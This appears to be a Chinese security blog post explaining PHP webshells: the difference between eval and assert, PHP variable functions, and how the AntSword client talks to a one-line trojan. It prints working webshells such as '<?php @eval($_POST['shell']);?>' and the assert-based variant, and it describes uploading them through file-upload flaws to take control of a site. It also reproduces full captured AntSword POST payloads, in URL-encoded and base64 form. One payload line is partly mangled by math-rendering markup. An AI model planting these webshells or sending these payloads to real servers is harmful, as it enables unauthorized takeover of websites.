



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://example.com/2022/12/31/webshell/">



  <title>
webshell - web安全 |
Yume Shoka = Hexo</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">webshell
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-12-31 13:38:45">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-12-31T13:38:45+08:00">2022-12-31</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeybxm1pj20zk0m8niv.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitzannuj20zk0m8b29.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="In web安全"><span itemprop="name">web安全</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/31/webshell/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="John Doe">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="php-webshell"><a class="markdownIt-Anchor" href="#php-webshell">#</a> php webshell</h1>
<h2 id="eval与assert一句话木马分析"><a class="markdownIt-Anchor" href="#eval与assert一句话木马分析">#</a> eval 与 assert 一句话木马分析</h2>
<p>实验环境:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:5.4.45</span><br><span class="line">mysql:5.5.62</span><br></pre></td></tr></table></figure>
<p>注意：这小节中使用 php5 作为 php 实验环境，但 php5 和 php7 在一些函数中有改变，会在下一小节详细叙述</p>
<h3 id="eval定义和用法"><a class="markdownIt-Anchor" href="#eval定义和用法">#</a> eval 定义和用法</h3>
<blockquote>
<p>eval () 函数把字符串按照 PHP 代码来计算（计算 = 执行）。</p>
<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
<p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval () 函数返回 false</p>
<p>返回语句会立即终止对字符串的计算。</p>
<p>注释：该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用</p>
</blockquote>
<h3 id="assert的定义与用法"><a class="markdownIt-Anchor" href="#assert的定义与用法">#</a> assert 的定义与用法</h3>
<blockquote>
<p>assert () 功能是判断一个表达式是否成立，返回 true or false，重点是函数会执行此表达式。如果表达式为函数如 assert (“echo (1)”)，则会输出 1，而如果 assert (“echo 1;”) 则不会有输出。</p>
<p>assert 把整个字符串参数当 php 代码执行</p>
<p>assert 在 php 中被认为是一个函数</p>
</blockquote>
<h3 id="eval与assert的区别"><a class="markdownIt-Anchor" href="#eval与assert的区别">#</a> eval 与 assert 的区别</h3>
<blockquote>
<p>二者都可以执行 PHP 语句。（eval 规范更加严格一些，必须符合 PHP 代码要求。而 assert 则没有那么严格，执行 PHP 表达式即可。并不是对 assert 无计可施，可以采用 assert_option () 来进行对 assert 的控制）但是在生产环境强烈建议不使用 assert 函数 (哪怕对其限制，也并不安全)。</p>
<p>都常被用来写一句话木马</p>
</blockquote>
<blockquote>
<p>eval 是一个<strong>语言构造器</strong>（是 PHP 自身的语言结构）而不是一个函数，<strong>不能被可变函数调用</strong>；assert 在 php 中被认为是一个函数，能被可变函数调用。</p>
<p>eval 规范更加严格一些，必须符合 PHP 代码要求，assert 则没有那么严格，执行 PHP 表达式即可</p>
</blockquote>
<h3 id="php可变函数"><a class="markdownIt-Anchor" href="#php可变函数">#</a> php 可变函数</h3>
<p>PHP 支持变量函数：通过变量保存一个函数的名字，然后在变量后跟上一个小括号就能调用。变量函数可以用来编写 webshell 绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function website()&#123;</span><br><span class="line">        echo &#x27;C语言中文网&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    function url($str = &#x27;&#x27;)&#123;</span><br><span class="line">        echo $str.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    function title($string)&#123;</span><br><span class="line">        echo $string;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $funcname = &#x27;website&#x27;;</span><br><span class="line">    $funcname();</span><br><span class="line">    $funcname = &#x27;url&#x27;;</span><br><span class="line">    $funcname(&#x27;http://c.biancheng.net/php/&#x27;);</span><br><span class="line">    $funcname = &#x27;title&#x27;;</span><br><span class="line">    $string = &#x27;PHP 教程&#x27;;</span><br><span class="line">    $funcname($string);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C语言中文网</span><br><span class="line">http://c.biancheng.net/php/</span><br><span class="line">PHP 教程</span><br></pre></td></tr></table></figure>
<h3 id="php-语法构造器"><a class="markdownIt-Anchor" href="#php-语法构造器">#</a> php 语法构造器</h3>
<p><strong>php 语法构造器不能被可变函数调用</strong></p>
<p>eval 属于 PHP 语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用（虽然她确实像极了函数原型），这样的语法构造还包括：echo，print，unset ()，isset ()，empty ()，include，require 等。换句话说就是 echo，print，unset ()，isset ()，empty ()，include，require 等语言结构不能被可变函数调用。</p>
<p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<p>print 和 print_r 在 PHP 中都起打印语句的作用， <code>print</code> <strong> 属于不能被可变函数调用的那一类，</strong> <code>print_r</code> <strong> 属于能被可变函数调用的那一类。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$b = &#x27;print_r&#x27;;</span><br><span class="line">$b(&#x27;print_r 能被可变函数调用 &lt;br&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">$a = &#x27;print&#x27;;</span><br><span class="line">$a(&#x27;print 不能被可变函数调用 &lt;br&gt;&#x27;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r 能被可变函数调用</span><br><span class="line"></span><br><span class="line">Fatal error: Call to undefined function print() in D:\wwwroot\www.shinya.com\printr.php on line 6</span><br></pre></td></tr></table></figure>
<p>eval 和 assert 都可以执行 PHP 语句， <code>eval</code> <strong> 属于不能被可变函数调用的那一类，</strong> <code>assert</code> <strong> 属于能被可变函数调用的那一类。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$c = &#x27;eval&#x27;;</span><br><span class="line">$c(phpinfo());</span><br><span class="line">//Fatal error: Call to undefined function eval() in D:\wwwroot\www.shinya.com\printr.php on line 3</span><br><span class="line"></span><br><span class="line">$d = &#x27;assert&#x27;;</span><br><span class="line">$d(phpinfo());</span><br><span class="line">//PHP Version 5.4.45</span><br></pre></td></tr></table></figure>
<p>这么看来 eval 其实并不能算是‘函数’，而是 PHP 自身的语言结构，如果需要用‘可变’的方式调用，需要自己构造，类似这样子的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function eval_1($str)</span><br><span class="line">&#123;</span><br><span class="line">   eval($str);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a=&#x27;eval_1&#x27;;</span><br><span class="line">$a(&#x27;phpinfo()&#x27;);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p><strong>eval 其实是 Zend 的函数，而 assert 是 PHP_FUNCTION 宏编写的，最后在调用上是不同的。</strong></p>
<h3 id="一句话木马的原理"><a class="markdownIt-Anchor" href="#一句话木马的原理">#</a> 一句话木马的原理</h3>
<p>利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过蚁剑等 webshell 工具即可获取和控制整个网站目录。</p>
<p>php 一句话木马:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST [‘shell’] 表示 shell 的取值为 HTTP 的 POST 方式。即通过 eval () 函数执行 shell 里面的内容，并且不报错。</p>
<p>中国蚁剑也同时 post 了 xian 这个数据为 %40ini_set 之类的数据，而我们又必须清楚一点，我们的 eval 函数中参数是字符，assert 函数中参数为表达式 （或者为函数），如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">assert(eval(‘echo 1;’));//类似这样</span><br><span class="line">1=assert</span><br><span class="line">2=eval(base64_decode())</span><br><span class="line">$_POST[&#x27;1&#x27;]($_POST[2])</span><br><span class="line">assert(eval(base64_decode))</span><br></pre></td></tr></table></figure>
<h3 id="_post1_post2"><a class="markdownIt-Anchor" href="#_post1_post2">#</a> \_POST\['1'](_POST[‘2’]);</h3>
<p>post 传入参数  <code>1=assert&amp;2=phpinfo();</code>  phpinfo () 被执行，证明木马可用</p>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115041090.png" alt="image-20221219115041090" style="zoom:80%;" />
<h4 id="连接方式一"><a class="markdownIt-Anchor" href="#连接方式一">#</a> <strong>连接方式一：</strong></h4>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115254130.png" alt="image-20221219115254130"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115339983.png" alt="image-20221219115339983"></p>
<p>连接密码和下面的 $_POST 中的内容一致，编码可选，不影响连接</p>
<p>payload 分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /uuuu.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:18888</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1026</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">1=assert&amp;2=eval(%24_POST%5B&#x27;shabi&#x27;%5D)&amp;shabi=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2204e9a%22%3Becho%20%40asenc(%24output)%3Becho%20%22d18a2%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B</span><br></pre></td></tr></table></figure>
<p>urldecode 后的 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=assert&amp;2=eval($_POST[&#x27;shabi&#x27;])&amp;shabi=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;04e9a&quot;;echo @asenc($output);echo &quot;d18a2&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;	&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;	&quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;	&#123;$s&#125;&quot;;echo $R;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure>
<p><code>1=assert&amp;2=eval($_POST['shell'])</code>  这部分代码与  <code>$_POST['1']($_POST['2']);</code>  构成了一句话木马。等价于下列的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(eval($_POST[&#x27;shabi&#x27;]));</span><br></pre></td></tr></table></figure>
<p>通过 shabi 这个自己设立的变量传递参数，eval () 会执行 shabi 中参数的内容。</p>
<p>shell=@ini_set(“display_errors”,“0”);@set_time_limit(0);<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>p</mi><mi>d</mi><mi>i</mi><mi>r</mi><mo>=</mo><mi mathvariant="normal">@</mi><mi>i</mi><mi>n</mi><msub><mi>i</mi><mi>g</mi></msub><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi mathvariant="normal">&quot;</mi><mi>o</mi><mi>p</mi><mi>e</mi><msub><mi>n</mi><mi>b</mi></msub><mi>a</mi><mi>s</mi><mi>e</mi><mi>d</mi><mi>i</mi><mi>r</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">)</mo><mo separator="true">;</mo><mi>i</mi><mi>f</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">opdir=@ini_get(&quot;open_basedir&quot;);if(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal">p</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">@</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord">&quot;</span><span class="mord mathnormal">o</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord">&quot;</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span></span></span></span>opdir) …(省略)… 就是蚁剑通过 shell 参数传递的参数内容，传递的这些参数是蚁剑能够控制后台的核心代码。</p>
<h4 id="连接方式二"><a class="markdownIt-Anchor" href="#连接方式二">#</a> <strong>连接方式二：</strong></h4>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115545461.png" alt="image-20221219115545461"></p>
<p>一定需要选择 base64 编码，因为蚁剑在处理 base64 时会做如下处理 <code>@eval(@base64_decode</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /uuuu.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:18888</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 949</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">1=assert&amp;2=%40eval(%40base64_decode(%24_POST%5B_0xe64103ac522dd%5D))%3B&amp;_0xe64103ac522dd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTNjNDkiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjE1N2IyIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D</span><br></pre></td></tr></table></figure>
<p>urldeocde</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=assert&amp;2=@eval(@base64_decode($_POST[_0xe64103ac522dd]));&amp;_0xe64103ac522dd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTNjNDkiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjE1N2IyIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=</span><br></pre></td></tr></table></figure>
<p>base64decode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;e3c49&quot;;echo @asenc($output);echo &quot;157b2&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;	&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;	&quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;	&#123;$s&#125;&quot;;echo $R;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure>
<p>当我们选择了 base64 编码的情况下蚁剑在连接密码的基础上添加了 eval 语句，并且对传输的变量 <code>_0xe64103ac522dd</code>  进行了 base64 编码，当 php 执行 <code>_0xe64103ac522dd</code>  里面携带的代码时，蚁剑即可获取和控制整个网站目录。</p>
<p>如果不选择 base64 编码那么会变成 <code>0=assert&amp;1=%40ini_set(%22display_errors</code> ,assert 中执行的是函数，因此连接失败</p>
<h4 id="不能写成1eval2这种形式呢"><a class="markdownIt-Anchor" href="#不能写成1eval2这种形式呢">#</a> 不能写成 <code>1=eval&amp;2</code>  这种形式呢</h4>
<p>原因是因为 eval 不能被可变函数调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//Fatal error: Call to undefined function eval()</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval函数中参数是字符，如：</span><br><span class="line">eval(&#x27;echo 1;&#x27;);</span><br><span class="line">assert函数中参数为表达式 （或者为函数），如：</span><br><span class="line">assert(phpinfo()) </span><br></pre></td></tr></table></figure>
